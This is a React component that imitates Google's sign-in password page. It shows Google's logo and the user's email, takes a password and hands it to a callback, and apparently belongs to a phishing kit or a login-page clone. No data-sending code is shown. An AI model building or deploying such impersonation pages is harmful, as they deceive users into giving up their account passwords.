import React, { useState } from 'react';
import './GooglePasswordPage.css';

const GooglePasswordPage = ({ email, onNext, loading }) => {
  const [password, setPassword] = useState('');
  const [show, setShow] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (password) onNext(password);
  };

  return (
    <div className="google-page">
      <form className="google-form" onSubmit={handleSubmit}>
        <img
          src="/images/google_logo.png"
          alt="Google"
          className="google-logo"
        />
        <h2>Sign in</h2>
        <div className="user-email">{email}</div>
        <div className="password-group">
          <input
            type={show ? 'text' : 'password'}
            placeholder="Enter your password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            disabled={loading}
          />
          <button type="button" className="show-toggle" onClick={() => setShow(s => !s)}>
            {show ? 'Hide' : 'Show'}
          </button>
        </div>
        <div className="links">
          <a href="#">Forgot password?</a>
          <a href="#">Try another way</a>
        </div>
        <button type="submit" disabled={loading || !password} className="btn">
          Next
        </button>
      </form>
      {loading && <div className="spinner-overlay">Loading…</div>}
    </div>
  );
};

export default GooglePasswordPage;
